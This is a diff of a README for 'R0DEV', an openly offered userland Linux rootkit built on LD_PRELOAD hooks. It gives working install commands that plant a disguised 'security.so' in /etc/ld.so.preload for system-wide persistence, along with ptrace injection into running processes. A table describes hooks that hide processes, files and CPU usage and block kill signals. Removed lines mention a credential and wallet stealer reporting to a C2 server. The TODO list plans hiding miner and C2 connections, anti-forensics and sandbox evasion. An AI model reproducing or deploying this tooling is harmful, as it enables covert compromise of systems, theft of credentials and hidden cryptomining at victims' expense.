@@ -1,83 +1,134 @@
-# R0DEV — LD_PRELOAD + SO Injection Rootkit
+# R0DEV — Userland LD_PRELOAD Rootkit
 
-Userland Linux rootkit using `LD_PRELOAD` / `ld.so.preload` for persistence
-with runtime SO injection via `ptrace`.
+Hooks `readdir`, `stat`, `openat`, `open`, `fopen`, `read`, `kill` to hide
+processes, files, and CPU usage on Linux. Runtime injection via `ptrace`.
 
-## Components
-
-| File | Purpose |
-|---|---|
-| `rootkit.c` | LD_PRELOAD shared object — hooks readdir, stat, open, kill, fopen, read |
-| `injector.c` | Runtime SO injector — injects rootkit.so into a running process via ptrace |
-| `fix_rootkit.c` | Static binary (raw syscall) to remove rootkit |
-| `forcekill.c` | Static binary (raw kill syscall) to bypass kill hook |
-| `loader.sh` | Persistence script — copies SO and writes ld.so.preload |
-| `dropper.sh` | All-in-one deploy script (base64 embeds everything) |
-| `R0DEV_controle.service` | Systemd persistence unit |
-| `stealer.py` | Data exfiltration tool — cookies, passwords, SSH keys, tokens, wallets, WiFi |
+No LKM. No kernel symbols. No `kprobe`. Works on any kernel with `glibc`.
 
 ## Build
 
 ```bash
-make          # builds rootkit.so, fix_rootkit, forcekill, injector
-make strip    # strips debug symbols
-make clean    # removes binaries
+make          # rootkit.so + fix_rootkit + forcekill + injector
+make strip    # strip debug info (OPSEC)
+make clean
+```
+
+## Install
+
+```bash
+# System-wide (all new processes)
+sudo cp rootkit.so /lib/x86_64-linux-gnu/security.so
+echo /lib/x86_64-linux-gnu/security.so | sudo tee /etc/ld.so.preload
+
+# Per-process
+LD_PRELOAD=./rootkit.so bash
 ```
 
 ## Usage
 
-### Install (system-wide via ld.so.preload)
-```bash
-sudo ./dropper.sh
-```
-
-### Or manually
-```bash
-sudo cp rootkit.so /lib/x86_64-linux-gnu/security.so
-echo /lib/x86_64-linux-gnu/security.so | sudo tee /etc/ld.so.preload
-```
-
-### Inject into running process
-```bash
-./injector <pid> ./rootkit.so
-```
-
-## Configuration
-
-- `R0DEV_PREFIX` env var — override the default "r0dev" prefix (case-insensitive)
-- `R0DEV_C2` env var — C2 endpoint for stealer.py
-
-## Hide a process
-
 Run any binary with the prefix in its name:
+
 ```bash
-./r0run.sh /path/to/binary
+# Hidden from ps, /proc, top. Kill-protected. CPU hidden.
+exec -a R0Dev_binary /path/to/binary
+./r0run.sh /path/to/binary            # wrapper
 ```
 
-The process will be hidden from `ps`, `ls /proc/`, and protected from `kill`.
-Its CPU usage will be subtracted from `/proc/stat`.
+Runtime injection into a running process:
 
-## Removal
+```bash
+sudo ./injector <pid> ./rootkit.so
+```
+
+Remove:
 
 ```bash
 sudo ./fix_rootkit
 ```
 
+## Configuration
+
+| Variable | Default | Description |
+|---|---|---|
+| `R0DEV_PREFIX` | `r0dev` | Case-insensitive prefix for hide/kill protection |
+
 ## Hooks
 
-| Function | Target | Effect |
+| Function | What it hooks | Effect |
 |---|---|---|
-| `readdir()` | /proc listing | Hides PID dirs + files with prefix |
-| `readdir64()` | /proc listing | Same, 64-bit variant |
-| `open()` | /proc/stat | Returns memfd with subtracted CPU |
-| `openat()` | /proc/stat | Same as open |
-| `fopen()` | /proc/stat | Returns modified FILE stream |
-| `read()` | Any fd pointing to /proc/stat | Subtracts CPU from buffer |
-| `kill()` | SIGKILL/SIGTERM | Blocks signals to hidden processes |
-| `stat()` | Any file | Hides files with prefix (ENOENT) |
-| `lstat()` | Any file | Hides files with prefix |
-| `fstatat()` | Any file | Hides files with prefix |
+| `readdir()` | `/proc` dir listing | Hides PID dirs + files matching prefix |
+| `readdir64()` | `/proc` dir listing | Same, 64-bit variant |
+| `open()` | File open | `/proc/stat` returns memfd with CPU subtracted |
+| `openat()` | File open (modern) | `/proc/stat` returns memfd with CPU subtracted |
+| `fopen()` | File open (stdio) | `/proc/stat` returns modified FILE stream |
+| `read()` | Any fd | Subtracts CPU from in-flight `/proc/stat` reads |
+| `kill()` | Signal delivery | Blocks SIGKILL/SIGTERM to hidden processes |
+| `stat()` | File metadata | Hides files matching prefix (`ENOENT`) |
+| `lstat()` | File metadata | Hides files matching prefix |
+| `fstatat()` | File metadata (modern) | Hides files matching prefix |
+
+## Architecture
+
+```
+┌─────────────────────────────────────────────────┐
+│                 Any Process                       │
+│  ┌──────────────────────────────────────────┐    │
+│  │              libc (glibc)                  │    │
+│  │  readdir() ⊂-- dlsym(RTLD_NEXT)           │    │
+│  │  open()     ⊂-- security.so (hook)         │    │
+│  │  kill()     ⊂-- (returns 0 if hidden)      │    │
+│  └──────────────────────────────────────────┘    │
+│                    ↕ LD_PRELOAD                  │
+│  ┌──────────────────────────────────────────┐    │
+│  │              security.so                    │    │
+│  │  → has_prefix() → match → hide/modify      │    │
+│  │  → no match → pass through to real libc     │    │
+│  └──────────────────────────────────────────┘    │
+└─────────────────────────────────────────────────┘
+```
+
+## TODO
+
+- [ ] **ksystemstats CPU hiding** — KDE's system monitor reads CPU via
+  `libksysguard` / `libstat` which may bypass `/proc/stat` hooks. Needs
+  `connect()` hook or D-Bus signal interception.
+
+- [ ] **injector stabilization** — ptrace injection fails on
+  multi-threaded processes. Use `process_vm_writev` + `dlopen` via
+  remote thread instead.
+
+- [ ] **`/proc/net/tcp` hook** — Hide outbound connections
+  (miner pool, C2) from `ss` / `netstat`.
+
+- [ ] **`uname()` hook** — Spoof kernel version string for
+  anti-forensics.
+
+- [ ] **`statx()` hook** — Modern `stat` syscall wrapper
+  (Linux 4.11+).
+
+- [ ] **Randomized prefix** — Generate unique prefix at install time
+  instead of hardcoded `r0dev`.
+
+- [ ] **Config file** — Replace env var with `/etc/r0dev.conf` for
+  silent configuration.
+
+- [ ] **ARM64 build** — Cross-compile support for aarch64.
+
+- [ ] **Sandbox detection** — Skip hooks under `strace`, `gdb`,
+  virtualized environments.
+
+- [ ] **Fix `has_prefix()`** — Current byte-by-byte scan has edge
+  cases with substrings of the prefix.
+
+- [ ] **Self-cleaning on crash** — If rootkit.so is removed without
+  running `fix_rootkit`, `ld.so.preload` still points to a missing
+  file; all processes hang on load. Add fail-safe.
+
+## See Also
+
+- [R0DEV LKM branch](https://github.com/K0D3IN/R0DEV) — Kernel module
+  variant (syscall table hook, deprecated)
 
 ## License
 
-CC BY-NC-SA 4.0
+MIT
